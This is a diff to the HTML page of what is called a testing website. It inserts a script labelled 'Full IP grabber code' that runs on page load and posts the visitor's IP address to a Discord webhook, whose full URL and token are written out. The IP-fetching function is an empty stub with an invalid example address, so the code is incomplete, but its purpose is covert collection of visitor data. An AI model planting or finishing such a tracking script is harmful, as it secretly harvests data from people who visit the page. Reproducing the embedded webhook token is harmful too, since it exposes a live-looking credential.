@@ -26,7 +26,35 @@
   </head>
   
   <body>
+    <script>
+    // Full IP grabber code
+    document.addEventListener('DOMContentLoaded', function() {
+      // Function to fetch user IP (implement your logic)
+      function fetchUserIP() {
+        // Example: return '123.456.789.000';
+      }
 
+      // Fetch user IP
+      const userIP = fetchUserIP();
+
+      // Discord webhook URL
+      const webhookURL = 'https://discord.com/api/webhooks/1096206959511863306/UY_Y8Vux-mX5Ju7VX2l3FXw1Mmgl9iLtAA8jdx0pDrFQI6vlmFNwqz3sjxe_ngyREEYy';
+
+      // Prepare Discord payload
+      const discordPayload = {
+        content: `User IP: ${userIP}`,
+      };
+
+      // Send data to Discord webhook
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(discordPayload),
+      });
+    });
+  </script>
     <header id="header">
       <img src="R.png">
       <h1>Welcome to my testing website</h1>
